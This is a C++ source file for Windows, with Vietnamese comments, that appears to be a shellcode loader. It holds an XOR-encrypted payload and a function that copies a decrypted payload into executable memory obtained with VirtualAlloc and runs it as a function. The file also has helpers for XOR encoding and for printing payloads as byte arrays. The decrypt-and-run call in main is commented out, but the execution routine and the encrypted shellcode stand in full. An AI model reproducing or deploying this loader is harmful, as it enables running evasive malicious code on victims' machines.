#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>

//  HAM XOR
char *xorEncryption(const char *data, int dataSize, const char *key, int keySize);
//  DOC  TU FILE
char *readFile(const std::string &filename);
//  THUC THI PAYLOAD TRONG RAM
bool executeHexPayload(const char *hexPayload, size_t payloadSize);
//  IN
void printCharArray(const char *array, size_t size);

int main()
{
    // XOR key
    /*const char *key = "k";
    const int keySize = strlen(key);

    const char encryptedHexPayload[] = {
        "\x97\x23\xE8\x8F\x9B\x83\xAB\x6B\x6B\x6B\x2A\x3A\x2A\x3B\x39\x3A"
        "\x3D\x23\x5A\xB9\x0E\x23\xE0\x39\x0B\x23\xE0\x39\x73\x23\xE0\x39"
        "\x4B\x23\xE0\x19\x3B\x23\x64\xDC\x21\x21\x26\x5A\xA2\x23\x5A\xAB"
        "\xC7\x57\x0A\x17\x69\x47\x4B\x2A\xAA\xA2\x66\x2A\x6A\xAA\x89\x86"
        "\x39\x2A\x3A\x23\xE0\x39\x4B\xE0\x29\x57\x23\x6A\xBB\xE0\xEB\xE3"
        "\x6B\x6B\x6B\x23\xEE\xAB\x1F\x0C\x23\x6A\xBB\x3B\xE0\x23\x73\x2F"
        "\xE0\x2B\x4B\x22\x6A\xBB\x88\x3D\x23\x94\xA2\x2A\xE0\x5F\xE3\x23"
        "\x6A\xBD\x26\x5A\xA2\x23\x5A\xAB\xC7\x2A\xAA\xA2\x66\x2A\x6A\xAA"
        "\x53\x8B\x1E\x9A\x27\x68\x27\x4F\x63\x2E\x52\xBA\x1E\xB3\x33\x2F"
        "\xE0\x2B\x4F\x22\x6A\xBB\x0D\x2A\xE0\x67\x23\x2F\xE0\x2B\x77\x22"
        "\x6A\xBB\x2A\xE0\x6F\xE3\x23\x6A\xBB\x2A\x33\x2A\x33\x35\x32\x31"
        "\x2A\x33\x2A\x32\x2A\x31\x23\xE8\x87\x4B\x2A\x39\x94\x8B\x33\x2A"
        "\x32\x31\x23\xE0\x79\x82\x3C\x94\x94\x94\x36\x22\xD5\x1C\x18\x59"
        "\x34\x58\x59\x6B\x6B\x2A\x3D\x22\xE2\x8D\x23\xEA\x87\xCB\x6A\x6B"
        "\x6B\x22\xE2\x8E\x22\xD7\x69\x6B\x7A\x37\xAB\xC3\x6E\xEF\x2A\x3F"
        "\x22\xE2\x8F\x27\xE2\x9A\x2A\xD1\x27\x1C\x4D\x6C\x94\xBE\x27\xE2"
        "\x81\x03\x6A\x6A\x6B\x6B\x32\x2A\xD1\x42\xEB\x00\x6B\x94\xBE\x3B"
        "\x3B\x26\x5A\xA2\x26\x5A\xAB\x23\x94\xAB\x23\xE2\xA9\x23\x94\xAB"
        "\x23\xE2\xAA\x2A\xD1\x81\x64\xB4\x8B\x94\xBE\x23\xE2\xAC\x01\x7B"
        "\x2A\x33\x27\xE2\x89\x23\xE2\x92\x2A\xD1\xF2\xCE\x1F\x0A\x94\xBE"
        "\x23\xEA\xAF\x2B\x69\x6B\x6B\x22\xD3\x08\x06\x0F\x6B\x6B\x6B\x6B"
        "\x6B\x2A\x3B\x2A\x3B\x23\xE2\x89\x3C\x3C\x3C\x26\x5A\xAB\x01\x66"
        "\x32\x2A\x3B\x89\x97\x0D\xAC\x2F\x4F\x3F\x6A\x6A\x23\xE6\x2F\x4F"
        "\x73\xAD\x6B\x03\x23\xE2\x8D\x3D\x3B\x2A\x3B\x2A\x3B\x2A\x3B\x22"
        "\x94\xAB\x2A\x3B\x22\x94\xA3\x26\xE2\xAA\x27\xE2\xAA\x2A\xD1\x12"
        "\xA7\x54\xED\x94\xBE\x23\x5A\xB9\x23\x94\xA1\xE0\x65\x2A\xD1\x63"
        "\xEC\x76\x0B\x94\xBE\xD0\x9B\xDE\xC9\x3D\x2A\xD1\xCD\xFE\xD6\xF6"
        "\x94\xBE\x23\xE8\xAF\x43\x57\x6D\x17\x61\xEB\x90\x8B\x1E\x6E\xD0"
        "\x2C\x78\x19\x04\x01\x6B\x32\x2A\xE2\xB1\x94\xBE\x6B"};

    char *decryptedPayload = xorEncryption(encryptedHexPayload, sizeof(encryptedHexPayload), key, keySize);
    executeHexPayload(decryptedPayload, sizeof(encryptedHexPayload));*/
    std::string input = "Generated_key.txt";
    const char *xorKey = readFile(input);
    const int keySize = strlen(xorKey);

    std::cout << xorKey << std::endl;
    std::cout << keySize << std::endl;

    return 0;
}

char *xorEncryption(const char *data, int dataSize, const char *key, int keySize)
{
    char *encryptedData = new char[dataSize];
    for (int i = 0; i < dataSize; ++i)
    {
        encryptedData[i] = data[i] ^ key[i % keySize];
    }
    return encryptedData;
}

char *readHexFromFile(const std::string &fileName, size_t &size)
{
    std::ifstream file(fileName, std::ios::binary);

    if (!file)
    {
        std::cerr << "Failed to open file: " << fileName << std::endl;
        return nullptr;
    }

    // Read the content of the file into a stringstream
    std::stringstream buffer;
    buffer << file.rdbuf();

    // Get the size of the content
    size = buffer.str().size();

    // Allocate memory for the char array
    char *hexData = new char[size + 1]; // Add 1 for the null terminator

    // Read the content of the stringstream into the char array
    buffer.read(hexData, size);

    // Close the file
    file.close();

    // Null terminate the char array
    hexData[size] = '\0';

    return hexData;
}

bool executeHexPayload(const char *hexPayload, size_t payloadSize)
{
    // Allocate executable memory
    void *execMemory = VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == nullptr)
    {
        std::cerr << "Failed to allocate executable memory." << std::endl;
        return false;
    }

    // Copy the hex payload into the allocated memory
    memcpy(execMemory, hexPayload, payloadSize);

    // Cast the memory address to a function pointer and call the function
    void (*payloadFunction)() = reinterpret_cast<void (*)()>(execMemory);
    payloadFunction();

    // Free the allocated memory
    VirtualFree(execMemory, 0, MEM_RELEASE);
    return true;
}

void printCharArray(const char *array, size_t size)
{
    printf("const char encryptedHexPayload[] = {\n\t\"");
    for (size_t i = 0; i < size; ++i)
    {
        printf("\\x%02X", (unsigned char)array[i]);
        if (i != size - 1)
        {
            if ((i + 1) % 16 == 0)
            {
                printf("\"\n\t\"");
            }
            else
            {
                printf("");
            }
        }
    }
    printf("\"\n};\n");
}

char *readFile(const std::string &filename)
{
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        std::cerr << "Error opening file: " << filename << std::endl;
        return nullptr;
    }

    std::streampos fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char *buffer = new char[fileSize];
    if (!buffer)
    {
        std::cerr << "Error allocating memory for file content." << std::endl;
        return nullptr;
    }

    file.read(buffer, fileSize);
    file.close();

    return buffer;
}